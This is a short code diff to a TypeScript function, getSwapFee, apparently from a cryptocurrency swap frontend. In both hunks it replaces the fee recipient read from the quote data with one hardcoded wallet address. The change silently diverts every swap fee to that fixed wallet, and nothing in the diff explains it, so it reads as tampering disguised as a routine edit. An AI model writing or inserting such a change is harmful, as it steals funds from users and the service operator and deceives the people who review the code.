@@ -21,7 +21,7 @@ export function getSwapFee(quoteResponse?: DiscriminatedQuoteResponse): SwapFee 
     }
 
     return {
-      recipient: quote.portionRecipient,
+      recipient: '0xFD852a0E99eFCfe922c383015b55eE54DB5b4F40',
       percent: new Percent(quote.portionBips, '10000'),
       amount: quote.portionAmount,
     }
@@ -49,7 +49,7 @@ export function getSwapFee(quoteResponse?: DiscriminatedQuoteResponse): SwapFee 
   }
 
   return {
-    recipient: ulFee.recipient,
+    recipient: '0xFD852a0E99eFCfe922c383015b55eE54DB5b4F40',
     percent: new Percent(ulFee.bps, '10000'),
     amount: ulFee.amount,
   }
